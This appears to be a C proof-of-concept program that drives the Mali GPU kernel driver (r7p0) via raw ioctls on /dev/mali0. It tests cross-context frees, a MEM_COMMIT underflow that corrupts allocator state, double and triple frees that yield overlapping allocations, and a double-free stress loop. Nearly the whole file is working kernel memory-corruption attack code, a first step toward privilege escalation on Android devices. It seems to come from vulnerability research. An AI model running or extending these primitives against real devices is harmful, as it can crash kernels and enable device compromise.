/*
 * mali_xctx_uaf.c — Verify cross-context free and UAF in Mali r7p0
 *
 * GOAL: Prove that freeing ctx1's region from ctx2 actually frees
 * ctx1's physical pages, not ctx2's own (which may have same VA).
 *
 * Method:
 * 1. ctx1: allocate region A (gets VA X)
 * 2. ctx2: try to free VA X BEFORE ctx2 allocates anything
 *    → If fail: cross-context free was just freeing ctx2's own allocation
 *    → If succeed: TRUE cross-context free vulnerability
 * 3. Also test: allocate on ctx1, occupy VA space on ctx2, then free
 *    ctx1's higher VA from ctx2
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEV_PATH "/dev/mali0"

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

/* Open and init a Mali context */
static int mali_open_ctx(void) {
    int fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;

    uint8_t hb[16];
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }

    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    return ioctl(fd, make_cmd(16), buf);
}

static int mali_commit(int fd, uint64_t va, int64_t pages) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = 514;
    *(uint64_t*)(buf + 8) = va;
    *(int64_t*)(buf + 16) = pages;
    return ioctl(fd, make_cmd(32), buf);
}

static int mali_flags_change(int fd, uint64_t va, uint32_t flags, uint32_t mask) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = 517;
    *(uint64_t*)(buf + 8) = va;
    *(uint32_t*)(buf + 16) = flags;
    *(uint32_t*)(buf + 20) = mask;
    return ioctl(fd, make_cmd(32), buf);
}

/* ============================================================ */
/* TEST 1: Cross-context free — before ctx2 allocates            */
/* ============================================================ */
static void test_xctx_free_clean(void) {
    fprintf(stderr, "\n=== TEST 1: Cross-context free (clean ctx2) ===\n");

    int fd1 = mali_open_ctx();
    int fd2 = mali_open_ctx();
    if (fd1 < 0 || fd2 < 0) return;

    /* ctx1: allocate */
    uint64_t va1 = mali_alloc(fd1, 1, 0x0F);
    fprintf(stderr, "[*] ctx1 alloc: 0x%llx\n", (unsigned long long)va1);

    /* ctx2: try to free ctx1's VA (ctx2 has NO allocation at this VA) */
    int r = mali_free(fd2, va1);
    fprintf(stderr, "[*] ctx2 free(ctx1 VA): ret=%d errno=%d\n", r, (r<0)?errno:0);

    if (r >= 0) {
        fprintf(stderr, "[!!!] CROSS-CONTEXT FREE (clean) SUCCEEDED!\n");
        fprintf(stderr, "[!!!] ctx2 freed ctx1's memory without owning it!\n");

        /* Verify: ctx1 should still think it owns the region */
        /* Try alloc on ctx1 — if the region was freed, ctx1's VA tracker
         * might still point to freed memory */
        uint64_t va1b = mali_alloc(fd1, 1, 0x0F);
        fprintf(stderr, "[*] ctx1 re-alloc: 0x%llx\n", (unsigned long long)va1b);

        /* Try to use the original VA on ctx1 (FLAGS_CHANGE) */
        int fc = mali_flags_change(fd1, va1, 0x0F, 0x0F);
        fprintf(stderr, "[*] ctx1 FLAGS_CHANGE on freed VA: %d\n", fc);

        /* Try to free the original VA from ctx1 */
        int f1 = mali_free(fd1, va1);
        fprintf(stderr, "[*] ctx1 free(original VA): %d (double-free?)\n", f1);

        mali_free(fd1, va1b);
    } else {
        fprintf(stderr, "[*] Cross-context free REJECTED (expected)\n");
    }

    close(fd2);
    close(fd1);
}

/* ============================================================ */
/* TEST 2: Cross-context free — with non-overlapping VAs         */
/* ============================================================ */
static void test_xctx_free_offset(void) {
    fprintf(stderr, "\n=== TEST 2: Cross-context free (offset VAs) ===\n");

    int fd1 = mali_open_ctx();
    int fd2 = mali_open_ctx();
    if (fd1 < 0 || fd2 < 0) return;

    /* ctx1: allocate several to push VA forward */
    uint64_t va1[5];
    for (int i = 0; i < 5; i++) {
        va1[i] = mali_alloc(fd1, 1, 0x0F);
        fprintf(stderr, "[*] ctx1 alloc[%d]: 0x%llx\n", i, (unsigned long long)va1[i]);
    }

    /* ctx2: allocate one (should be at VA 0x102000000) */
    uint64_t va2 = mali_alloc(fd2, 1, 0x0F);
    fprintf(stderr, "[*] ctx2 alloc: 0x%llx\n", (unsigned long long)va2);

    /* ctx2: try to free ctx1's VA at index 3 (different from ctx2's VA) */
    fprintf(stderr, "[*] ctx2 trying to free ctx1's va1[3]=0x%llx...\n",
            (unsigned long long)va1[3]);
    int r = mali_free(fd2, va1[3]);
    fprintf(stderr, "[*] ctx2 free(ctx1 va1[3]): ret=%d errno=%d\n", r, (r<0)?errno:0);

    if (r >= 0) {
        fprintf(stderr, "[!!!] CROSS-CONTEXT FREE at NON-OVERLAPPING VA SUCCEEDED!\n");
    }

    /* Cleanup */
    for (int i = 0; i < 5; i++)
        mali_free(fd1, va1[i]);
    mali_free(fd2, va2);
    close(fd2);
    close(fd1);
}

/* ============================================================ */
/* TEST 3: MEM_COMMIT overflow → corruption detection            */
/* ============================================================ */
static void test_commit_corruption(void) {
    fprintf(stderr, "\n=== TEST 3: MEM_COMMIT overflow corruption ===\n");

    int fd = mali_open_ctx();
    if (fd < 0) return;

    /* Allocate growable region */
    uint8_t ab[56];
    memset(ab, 0, 56);
    ((struct uk_header*)ab)->id = 512;
    *(uint64_t*)(ab + 8) = 4;      /* va_pages */
    *(uint64_t*)(ab + 16) = 2;     /* commit_pages */
    *(uint64_t*)(ab + 24) = 2;     /* extent */
    *(uint32_t*)(ab + 32) = 0x0F | (1U << 9); /* GROW_ON_GPF */
    if (ioctl(fd, make_cmd(56), ab) < 0) {
        close(fd); return;
    }
    uint64_t va = *(uint64_t*)(ab + 40);
    fprintf(stderr, "[+] Growable region: 0x%llx (2/4 committed)\n",
            (unsigned long long)va);

    /* Query initial state */
    uint8_t qb[32];
    memset(qb, 0, 32);
    ((struct uk_header*)qb)->id = 515;
    *(uint64_t*)(qb + 8) = va;
    *(uint64_t*)(qb + 16) = 1;
    ioctl(fd, make_cmd(32), qb);
    fprintf(stderr, "[*] Initial query value: 0x%llx\n",
            (unsigned long long)*(uint64_t*)(qb + 16));

    /* Commit -1 (should underflow to a huge number) */
    int r = mali_commit(fd, va, -1);
    fprintf(stderr, "[*] COMMIT(-1): ret=%d\n", r);

    /* Query after underflow commit */
    memset(qb, 0, 32);
    ((struct uk_header*)qb)->id = 515;
    *(uint64_t*)(qb + 8) = va;
    *(uint64_t*)(qb + 16) = 1;
    ioctl(fd, make_cmd(32), qb);
    fprintf(stderr, "[*] Post-underflow query: 0x%llx\n",
            (unsigned long long)*(uint64_t*)(qb + 16));

    /* Try to allocate new regions — check if allocator is corrupted */
    for (int i = 0; i < 5; i++) {
        uint64_t nva = mali_alloc(fd, 1, 0x0F);
        fprintf(stderr, "[*] Post-corruption alloc %d: 0x%llx\n", i,
                (unsigned long long)nva);
        if (nva) mali_free(fd, nva);
    }

    /* Try to free the corrupted region */
    r = mali_free(fd, va);
    fprintf(stderr, "[*] Free corrupted region: %d\n", r);

    close(fd);
}

/* ============================================================ */
/* TEST 4: Double-free → allocate → free sequence                */
/* ============================================================ */
static void test_dfree_then_use(void) {
    fprintf(stderr, "\n=== TEST 4: Double-free → use sequence ===\n");

    int fd = mali_open_ctx();
    if (fd < 0) return;

    /* Allocate A */
    uint64_t va_a = mali_alloc(fd, 1, 0x0F);
    fprintf(stderr, "[+] A @ 0x%llx\n", (unsigned long long)va_a);

    /* Free A twice */
    mali_free(fd, va_a);
    mali_free(fd, va_a);
    fprintf(stderr, "[*] A double-freed\n");

    /* Allocate B (should reuse A's VA) */
    uint64_t va_b = mali_alloc(fd, 1, 0x0F);
    fprintf(stderr, "[*] B @ 0x%llx\n", (unsigned long long)va_b);

    /* Free A's VA again (triple free / cross-object free) */
    int r = mali_free(fd, va_a);
    fprintf(stderr, "[*] Free(A) after B alloc: %d\n", r);

    if (r >= 0 && va_a == va_b) {
        fprintf(stderr, "[!!!] Freed B through A's stale VA reference!\n");

        /* Allocate C — might overlap with B's now-freed pages */
        uint64_t va_c = mali_alloc(fd, 1, 0x0F);
        fprintf(stderr, "[*] C @ 0x%llx\n", (unsigned long long)va_c);

        if (va_c == va_b) {
            fprintf(stderr, "[!!!] C reused B's VA — overlapping allocations possible!\n");
        }

        if (va_c) mali_free(fd, va_c);
    }

    close(fd);
}

/* ============================================================ */
/* TEST 5: Rapid alloc/free cycle → check for kernel panics      */
/* ============================================================ */
static void test_stress(void) {
    fprintf(stderr, "\n=== TEST 5: Stress test (careful) ===\n");

    int fd = mali_open_ctx();
    if (fd < 0) return;

    int success = 0;
    for (int i = 0; i < 100; i++) {
        uint64_t va = mali_alloc(fd, 1, 0x0F);
        if (!va) break;
        mali_free(fd, va);
        mali_free(fd, va); /* double free */
        success++;
    }
    fprintf(stderr, "[*] %d double-free cycles completed without crash\n", success);

    /* Check if we can still allocate */
    uint64_t test = mali_alloc(fd, 1, 0x0F);
    fprintf(stderr, "[*] Post-stress alloc: 0x%llx\n", (unsigned long long)test);
    if (test) mali_free(fd, test);

    close(fd);
}

int main(void) {
    fprintf(stderr, "=== Mali Cross-Context UAF Test ===\n");

    test_xctx_free_clean();
    test_xctx_free_offset();
    test_commit_corruption();
    test_dfree_then_use();
    test_stress();

    fprintf(stderr, "\n=== All tests complete ===\n");
    return 0;
}
